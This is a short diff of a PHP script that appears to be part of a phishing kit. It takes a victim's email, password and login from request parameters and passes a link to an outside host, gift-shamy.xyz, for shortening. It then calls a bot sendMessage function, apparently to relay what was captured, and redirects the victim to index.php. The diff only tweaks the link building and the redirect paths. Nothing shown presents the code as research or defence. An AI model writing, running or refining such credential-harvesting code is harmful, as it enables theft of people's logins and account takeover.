@@ -36,8 +36,8 @@ $admin = $info[info]['id'];
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
-$linky = $_SERVER['HTTP_HOST'];
-$mink ="https://$linky/index.html";
+$linky = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+$mink ="http://$linky";
 $api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
 $result = json_decode(file_get_contents($api), true); 
 $shortt = $result["short"];
@@ -71,9 +71,9 @@ bot("sendMessage",[
 ?>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0; url='/index.php'" />
+    <meta http-equiv="refresh" content="0; url='index.php'" />
     <script type="text/javascript">
-            window.location.href = "/index.php"
+            window.location.href = "index.php"
     </script>
  </head>
   <body>
